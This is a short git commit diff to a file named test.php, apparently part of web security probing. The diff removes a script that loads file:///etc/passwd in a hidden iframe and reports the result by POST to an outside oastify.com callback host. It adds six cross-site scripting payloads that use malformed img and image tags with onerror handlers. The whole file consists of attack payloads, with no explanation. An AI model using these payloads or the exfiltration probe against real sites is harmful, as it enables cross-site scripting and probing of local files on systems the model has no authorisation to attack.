71e2b35176c299848ca6b2e70dab210a63a2e552
Muhammad Qasim Munir <49307757+Muhammad-Qasim-Munir@users.noreply.github.com>
2024-12-14 11:10:10 +0500

    Update test.php

--- test.php
+++ test.php
@@ -1,20 +1,6 @@
-<script>
-  const iframe = document.createElement('iframe');
-  iframe.style.display = 'none';
-  iframe.src = 'file:///etc/passwd'; // Replace with the target file path
-  document.body.appendChild(iframe);
-
-  iframe.onload = () => {
-    fetch('https://vkj12zuf60tkbsz27qjd1spjpav1j17q.oastify.com', {
-      method: 'POST',
-      body: 'File exists: file:///etc/passwd'
-    });
-  };
-
-  iframe.onerror = () => {
-    fetch('https://vkj12zuf60tkbsz27qjd1spjpav1j17q.oastify.com', {
-      method: 'POST',
-      body: 'Error: Could not load file:///etc/passwd'
-    });
-  };
-</script>
+<image/src/onerror=prompt(8)>
+<img/src/onerror=prompt(8)>
+<image src/onerror=prompt(8)>
+<img src/onerror=prompt(8)>
+<image src =q onerror=prompt(8)>
+<img src =q onerror=prompt(8)>
